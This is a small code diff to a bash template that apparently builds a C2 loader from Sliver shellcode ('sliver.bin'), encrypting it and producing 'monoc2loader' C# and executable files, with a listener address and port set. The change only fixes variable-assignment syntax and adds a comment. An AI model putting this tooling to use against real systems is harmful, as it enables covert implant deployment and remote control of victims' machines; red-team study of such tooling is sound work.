@@ -9,7 +9,8 @@
 ## This is a template bash file
 
 ## parameter inputs, make sure fill in the following parameters correctly
-## [!!!] lhost and lport are not in use for this script, make sure arch and c2type are correct
+## [!!!] lhost and lport are not in use for this script, make sure arch and c2type are correct, 
+## make sure c2type has no space in middle.
 lhost="10.0.0.145"
 lport="8888"
 arch="x64"
@@ -36,8 +37,8 @@ mkdir output
 rawscfilename='sliver.bin'
 
 rawscfilename_enc=$rawscfilename'.enc'
-final_cs_filename = 'monoc2loader_'$c2type'.cs'
-final_exe_filename = 'monoc2loader_'$c2type'_'$arch'.exe'
+final_cs_filename='monoc2loader_'$c2type'.cs'
+final_exe_filename='monoc2loader_'$c2type'_'$arch'.exe'
 
 sleep 2
 
